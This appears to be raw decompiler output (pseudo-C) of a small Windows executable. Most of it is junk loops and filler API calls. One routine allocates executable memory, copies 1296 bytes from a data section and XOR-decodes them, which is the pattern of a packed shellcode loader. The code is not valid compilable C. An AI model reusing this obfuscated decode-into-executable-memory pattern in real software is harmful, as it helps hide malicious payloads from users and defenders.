__size32 global2 = 0;// 4 bytes
int global1 = 0;
__size32 global4 = 0;// 4 bytes
int global5 = 0;
__size32 global11 = 0;// 4 bytes
unsigned int global16 = 0;

void __imp_DeleteFileA();
void _start();
__size32 proc3(__size32 param1, __size32 param2, __size32 param3);
__size32 proc6(int param1, __size32 param2);
union { __size32 x377; bool x378; } proc9(__size32 param1);
__size32 proc11(__size32 param1);
__size32 proc14(int param1, int param2);
__size32 proc15();
__size32 proc16(int param1);
__size32 proc18(int param1);

// address: 0x401008
void proc1(__size32 param1, __size32 param2, __size32 param3) {
    __size32 *ebp; 		// r29
    void *esi; 		// r30
    int esp; 		// r28

    esp = proc3(param1, param2, param3); /* Warning: also results in ebp */
    esi = *esp;
    *(__size32*)(esi - 544) = *(esi - 544) - 0x2fced7e0;
    *(void **)esp = 866;
    IsValidCodePage();
    *(__size32*)(esi - 520) = 5;
    while (*(esi - 520) != 0) {
        *(__size32*)(esi - 520) = *(esi - 520) - 1;
        *(int*)(ebp - 92) = *(ebp - 92) | esi;
    }
    GetCurrentProcessId();
    return;
}

// address: 0x401a92
void __imp_DeleteFileA() {
    DeleteFileA();
    return;
}

// address: 0x401334
void _start() {
    return;
}

// address: 0x401410
__size32 proc3(__size32 param1, __size32 param2, __size32 param3) {
    __size32 eax; 		// r24
    __size32 *ebp; 		// r29
    int ebx; 		// r27
    __size32 ecx; 		// r25
    __size32 edi; 		// r31
    __size32 edx; 		// r26
    __size32 esi; 		// r30
    __size32 esi_1; 		// r30{82}
    int esp; 		// r28
    unsigned int *esp_1; 		// r28{22}
    __size32 local1; 		// param1{70}
    __size32 local2; 		// param3{77}

    edx = param2;
    esp = (esp - 4);
    local1 = param1;
    local2 = param3;
    do {
        param1 = local1;
        param3 = local2;
        *(__size32*)(esp - 244) = 0x4039c0;
        *(__size32*)(esp - 248) = *0x403c54;
        *(__size32*)(esp - 252) = *0x403ce8;
        *(__size32*)(esp - 256) = edx;
        *(__size32*)(esp - 260) = param1;
        eax = proc6(0x4039c0, param3); /* Warning: also results in esi, edx, esp_1, ebp, edi */
        local1 = eax;
        local2 = edi;
        ebx = *esp_1;
        esp = esp_1 + 4;
        edx = edx - eax + (esp < 240);
    } while (ebx < 0x2a76);
    ecx = GetCurrentThread();
    *(unsigned int*)esp_1 = 3;
    *(unsigned int*)(ebx - 48) = *esp_1;
    esi_1 = esi;
    while (*(ebx - 48) != 0) {
        *(__size32*)(ebx - 48) = *(ebx - 48) - 1;
        esi = esi_1 + *(ebx + 108);
        esi += *(ebp - 56) + ADDFLAGS32(esi_1, *(ebx + 108), esi);
        esi_1 = esi;
    }
    *(__size32*)(ebp - 160) = *(ebp - 160) - edi + LOGICALFLAGS32(ecx & 0xf4d60dfa);
    *(unsigned int*)esp_1 = 0;
    GetDriveTypeA();
    ebp = *ebp;
    return ebp;
}

// address: 0x4010cc
__size32 proc6(int param1, __size32 param2) {
    __size32 eax; 		// r24
    __size32 *ebp; 		// r29
    __size32 ecx; 		// r25
    int edx; 		// r26
    __size32 esi; 		// r30
    int esp; 		// r28
    unsigned int esp_2; 		// r28{76}
    int local0; 		// m[esp - 4]

    esp = (esp - 4);
    do {
        esp_2 = esp;
        *(__size32*)(esp_2 - 244) = 0x4037cc;
        *(__size32*)(esp_2 - 248) = 0;
        eax = GetDriveTypeA();
        edx = *(esp_2 - 248);
        esp = esp_2 - 244;
        *(__size32*)(esp_2 - 68) = 0;
L4:
        *(int*)(edx - 632) = *(edx - 632) ^ param1;
    } while (edx < 1824);
    *(__size32*)(esp_2 - 68)++;
    if (*(esp_2 - 68) != 5) {
        goto L4;
    }
    *(void **)(esp_2 - 248) = edx;
    *(__size32*)(esp_2 - 252) = *(esp_2 - 24);
    *(__size32*)(esp_2 - 256) = 0;
    *(__size32*)(esp_2 - 260) = eax;
    esi = proc9(param2); /* Warning: also results in ecx, esp, ebp */
    edx = *esp;
    *(__size32*)(ebp - 112) += ecx + (*(esp_2 - 68) < 5);
    *(__size32*)esp = edx;
    local0 = 11;
    eax = Sleep(*(esp - 4));
    edx = *esp;
    ebp = *ebp;
    return eax; /* WARNING: Also returning: esi := esi, edx := edx, ebp := ebp, edi := 0x74b44bc */
}

// address: 0x4019b4
union { __size32 x377; bool x378; } proc9(__size32 param1) {
    __size32 eax; 		// r24
    __size32 *ebp; 		// r29
    union { void * x375; unsigned int x376; } ebx; 		// r27
    __size32 ecx; 		// r25
    __size32 edx; 		// r26
    int esi; 		// r30
    int esp; 		// r28

    esi = proc11(param1); /* Warning: also results in esp, ebp */
    ebx = *esp;
    esi = esi & *(ebp - 216);
    *(__size32*)(ebx + 388) += ebx;
    eax = GetCurrentProcessId(); /* Warning: also results in edx */
    *(__size32*)(ebp - 292) = 4;
    do {
        edx += *(ebp - 144);
        *(__size32*)(ebx - 32) = *(ebx - 32) - eax;
        *(__size32*)(ebp - 292) = *(ebp - 292) - 1;
    } while (*(ebp - 292) != 0);
    esi += eax + (*(ebp - 292) < 0);
    *(int*)(ebp - 272) = *(ebp - 272) & eax;
    ecx = GetForegroundWindow();
    ebp = *ebp;
    return esi; /* WARNING: Also returning: ecx := ecx, ebp := ebp */
}

// address: 0x401138
__size32 proc11(__size32 param1) {
    __size32 eax; 		// r24
    __size32 ebp; 		// r29
    int ebx; 		// r27
    int ebx_1; 		// r27{86}
    __size32 edi; 		// r31
    int edx; 		// r26
    __size32 esi; 		// r30
    int esp; 		// r28
    unsigned int *esp_1; 		// r28{51}
    __size32 local1; 		// param1{80}

    esp = (esp - 4);
    local1 = param1;
    do {
        param1 = local1;
        *(int*)(esp - 28) = *(esp - 28) | 72;
        *(__size32*)(esp - 232) = 0x4036d4;
        eax = GetCurrentThreadId();
        edx = *(esp - 232);
        ebx = 5;
        do {
            ebx_1 = ebx;
            *(__size32*)(esp - 80) = *(esp - 80) - param1;
            eax = eax ^ 0x6337da0f;
            ebx = ebx_1 - 1;
        } while (ebx_1 - 1 != 0);
        *(__size32*)(esp - 232) = edx;
        *(__size32*)(esp - 236) = *(edx + 564);
        *(__size32*)(esp - 240) = *(edx + 1092);
        *(int*)(esp - 244) = ebx_1 - 1;
        *(__size32*)(esp - 248) = *(edx + 140);
        esi = proc14(*(esp - 436), ebx_1 - 1); /* Warning: also results in esp_1, ebp, edi */
        local1 = edi;
        local1 = edi;
        edx = *esp_1;
        esp = esp_1 + 4;
    } while (edx <= 0xea94);
    *(unsigned int*)esp_1 = edx;
    GetCurrentThread();
    ebp = *ebp;
    return esi; /* WARNING: Also returning: ebp := ebp */
}

// address: 0x4011a4
__size32 proc14(int param1, int param2) {
    __size32 eax; 		// r24
    __size32 *ebp; 		// r29
    int ebx; 		// r27
    __size32 edi; 		// r31
    __size32 edx; 		// r26
    __size32 esi; 		// r30
    int esp; 		// r28
    int local1; 		// param2{67}

    edx = GetCurrentThread();
    local1 = param2;
    global16 = 3;
    param2 = local1;
    while (*0x4036d4 != 0) {
        global16 = global16 - 1;
        ebx = param2 & param1;
        global1 = edx;
        local1 = ebx;
        param2 = local1;
    }
    esi = proc15(); /* Warning: also results in esp, ebp, edi */
    eax = *esp;
    tmp1 = *(ebp - 36);
    *(__size32*)(ebp - 36) = *(ebp - 36) + (global16 < 0) - 99;
    *(__size32*)(eax + 224) += esi + ADDFLAGS32(tmp1, -99, *(ebp - 36));
    *(__size32*)esp = eax;
    GetCurrentThread();
    ebp = *ebp;
    return esi; /* WARNING: Also returning: ebp := ebp, edi := edi */
}

// address: 0x4016b4
__size32 proc15() {
    __size32 eax; 		// r24
    __size32 ebp; 		// r29
    int ebx; 		// r27
    __size32 esi; 		// r30
    int esp; 		// r28
    union { void * x331; unsigned int x332; } *esp_1; 		// r28{22}

    esp = (esp - 4);
    do {
        *(int*)(esp - 132) = *(esp - 132) ^ 0x76c20687;
        *(__size32*)(esp - 288) = 0x403824;
        *(__size32*)(esp - 292) = *0x403df8;
        *(__size32*)(esp - 296) = global11;
        *(__size32*)(esp - 300) = *(esp - 236);
        esi = proc16(0x403824); /* Warning: also results in esp_1, ebp */
        ebx = *esp_1;
        eax = GetCommandLineA(); /* Warning: also results in esp */
        *(__size32*)(ebx - 676) = 0;
L4:
        if (*(ebx - 676) != 5) {
            *(__size32*)(ebx - 676)++;
            *(int*)(ebx + 704) = *(ebx + 704) ^ ebx;
            *(int*)(ebx + 312) = *(ebx + 312) ^ ebx;
            goto L4;
        }
    } while (ebx <= 0x297b);
    *(int*)(ebx - 472) = *(ebx - 472) ^ eax;
    GetCurrentProcessId();
    ebp = *ebp;
    return esi; /* WARNING: Also returning: ebp := ebp, edi := ebx */
}

// address: 0x40181c
__size32 proc16(int param1) {
    __size32 eax; 		// r24
    __size32 *ebp; 		// r29
    int ebx; 		// r27
    __size32 ecx; 		// r25
    unsigned int edi; 		// r31
    __size32 edx; 		// r26
    __size32 edx_1; 		// r26{74}
    __size32 esi; 		// r30
    int esp; 		// r28
    unsigned int *esp_1; 		// r28
    int local1; 		// param1{64}

    esp = (esp - 4);
    local1 = param1;
    do {
        param1 = local1;
        *(int*)(esp - 296) = param1 - 664;
        *(__size32*)(esp - 300) = *(esp - 68);
        *(int*)(esp - 304) = param1;
        esi = proc18(param1); /* Warning: also results in ebx, esp_1, ebp */
        local1 = ebx;
        edi = *esp_1;
        eax = GetCommandLineA(); /* Warning: also results in ecx, esp */
        edx = 0;
        do {
            edx_1 = edx;
            eax = eax - *(ebp - 32);
            eax = eax & 0xfffffffe;
            edx = edx_1 + 1;
        } while (edx_1 + 1 != 5);
        *(__size32*)(ebp - 136) = *(ebp - 136) - ecx + (edx_1 + 1 < 5);
    } while (edi < 0xa8fb);
    *(unsigned int*)esp_1 = (unsigned int)-2;
    GetThreadPriority();
    ebp = *ebp;
    return esi; /* WARNING: Also returning: ebp := ebp */
}

// address: 0x401478
__size32 proc18(int param1) {
    __size32 eax; 		// r24
    void *eax_1; 		// r24{88}
    __size32 ebp; 		// r29
    int ebx; 		// r27
    int ebx_1; 		// r27{91}
    __size32 ecx; 		// r25
    unsigned int ecx_1; 		// r25{89}
    int *edi; 		// r31
    int *edi_1; 		// r31{92}
    __size32 edx; 		// r26
    int esp; 		// r28
    int local1; 		// param1{79}

    esp = (esp - 4);
    local1 = param1;
    param1 = local1;
    ebx = param1 | 15 | global1;
    *(__size32*)(esp - 296) = 64;
    *(__size32*)(esp - 300) = 0x1000;
    *(__size32*)(esp - 304) = 1296;
    *(__size32*)(esp - 308) = 0;
    eax = VirtualAlloc(*(esp - 308), *(esp - 304), *(esp - 300), *(esp - 296)); /* Warning: also results in edx */
    global2 = eax;
    eax += 180;
    *(__size32*)(esp - 296) = 0x403000;
    edi = *(esp - 296);
    esp = esp - 292;
    ecx = 0;
    do {
        eax_1 = eax;
        ecx_1 = ecx;
        ebx_1 = ebx;
        edi_1 = edi;
        *(int*)(esp - 72) = *(esp - 72) ^ ebx_1;
        edi = edi_1 + 4;
        ebx = *edi_1;
        *(int*)(eax_1 - 180) = ebx;
        global4 = global4 - ((unsigned int)(edx & ebx_1) < ecx_1 * 4) + 87;
        eax = eax_1 + 4;
        edx = (edx & ebx_1) - ecx_1 * 4 + LOGICALFLAGS32(edx & ebx_1) ^ global5;
        *(int*)(eax_1 - 180) = *(eax_1 - 180) ^ 0xac87fa29;
        local1 = ebx;
        ecx = ecx_1 + 1;
    } while ((ecx_1 + 1) * 4 != 1296);
    GetActiveWindow();
    ebp = *esp;
    return 0x4038e4; /* WARNING: Also returning: ebx := ebx, ebp := ebp */
}

